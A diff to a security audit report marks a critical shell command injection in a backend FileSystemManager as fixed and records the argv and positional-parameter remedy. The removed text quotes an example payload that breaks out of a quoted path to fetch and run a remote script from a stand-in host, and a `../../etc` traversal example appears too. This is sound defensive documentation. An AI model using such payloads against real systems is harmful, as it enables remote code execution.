@@ -12,11 +12,6 @@ is not currently possible — keep it that way.
 
 Findings ranked by severity.
 
-> **⚠️ New — found while wiring the finding #2 backend fix:** `FileSystemManager`
-> has a **Critical shell command injection** (finding #6 below). It is not an
-> editor file, but it is the sink every editor file write/read/delete ultimately
-> reaches, so it is recorded here. **Not yet fixed.**
-
 ---
 
 ## 1. Path traversal — no sanitization on the path pipeline · **High** · ✅ FIXED
@@ -151,30 +146,34 @@ font-family text input is ever surfaced, validate against an allowlist.
 
 ---
 
-## 6. Shell command injection in `FileSystemManager` (backend) · **Critical** · ❌ NOT FIXED
+## 6. Shell command injection in `FileSystemManager` (backend) · **Critical** · ✅ FIXED
 
-`backend/src/services/FileSystemManager.ts` interpolates caller-supplied paths
-straight into `/bin/sh -c` strings:
+`backend/src/services/FileSystemManager.ts` interpolated caller-supplied paths
+straight into `/bin/sh -c` strings (`base64 "${filePath}"`, `rm -rf
+"${pathToRemove}"`, `mkdir -p "${dirName}"`, `ls -1p "${dirPath}" | awk ...`,
+`echo "${b64}" | base64 -d > "${filePath}"`). The double quotes are not
+escaping — a path containing `"`, `` ` ``, `$(...)`, or `;` broke out and ran
+arbitrary commands **inside the target container** (RCE in the sandbox).
 
-```ts
-`base64 "${filePath}"`                 // readFile
-`echo "${b64Content}" | base64 -d > "${filePath}"`  // writeFile
-`mkdir -p "${dirName}"`                // writeFile
-`rm -rf "${pathToRemove}"`             // deletePath
-`ls -1p "${dirPath}" | awk ...`        // listDirectory
-```
+**Fixed:** every method now passes paths as **argv** to `execBuffered` (which
+runs execve-style, no shell), so a path is only ever a literal argument:
+- `readFile` → `['base64', filePath]`
+- `deletePath` → `['rm', '-rf', pathToRemove]`
+- `listDirectory` → `['ls', '-1p', dirPath]`, with the directory/file
+  classification (previously an `awk` pipe) moved into Node.
+- `writeFile` → `['mkdir','-p',dirName]`, then — because a pipe+redirect needs a
+  shell and the exec API has no stdin — `['/bin/sh','-c','printf %s "$1" |
+  base64 -d > "$2"', 'sh', b64Content, filePath]`. The untrusted values are
+  shell **positional parameters** (`$1`/`$2`), which the shell substitutes as
+  literal data and never re-parses as code, so there is no injection.
 
-The double quotes are not escaping — a path containing `"`, `` ` ``, `$(...)`, or
-`;` breaks out and runs arbitrary commands **inside the target container**. e.g.
-`path = /workspace/x";curl evil.sh|sh;"` → RCE in the sandbox.
+Verified against a real shell: the old interpolation created an attacker canary
+file; the new positional form did not.
 
-Before finding #2's IDOR fix this was reachable on *any* sandbox by anyone; with
-the ownership guard it's now reachable only within a caller's own sandbox — but
-it is still a container-escape/lateral-movement primitive and must be fixed:
-pass paths as **argv** (no `sh -c`), or reject shell metacharacters, and combine
-with the backend re-validation promised for findings #1/#2. The frontend
-`safePath()` guard (#1) blocks the obvious cases from *our* UI, but the backend
-must never trust the client.
+> Note: this closes command **injection**. Path **traversal** on the backend
+> (e.g. `../../etc`) is a separate concern — the front-end `safePath()` (#1)
+> blocks it from our UI, but the backend should still canonicalize paths against
+> the sandbox workspace root. Tracked as defense-in-depth, not yet done.
 
 ---
 
@@ -192,12 +191,13 @@ must never trust the client.
 
 | # | Finding | Severity | State |
 |---|---------|----------|-------|
-| 6 | Shell command injection in `FileSystemManager` | Critical | ❌ **Not fixed — do next** |
+| 6 | Shell command injection in `FileSystemManager` | Critical | ✅ Fixed |
 | 1 | Path traversal (front-end path pipeline) | High | ✅ Fixed |
 | 2 | No auth/CSRF on sync/CRUD; IDOR | High | ✅ Fixed (client + server) |
 | 3 | REPL `eval()` under-sandboxed | Medium | ✅ Fixed |
 | 4 | No CSP / security headers | Low | ✅ Fixed (edge header still owed) |
 | 5 | localStorage → CSS custom property | Low | ➖ Accepted (defense-in-depth only) |
 
-**Do #6 next** — it is the highest-severity open item and the sink all editor
-file operations reach.
+All ranked findings are resolved. Remaining hardening is ops/defense-in-depth:
+production CSP + HSTS headers at the edge (#4), backend path canonicalization
+against the workspace root (#1/#6), and tightening `script-src` to nonces.
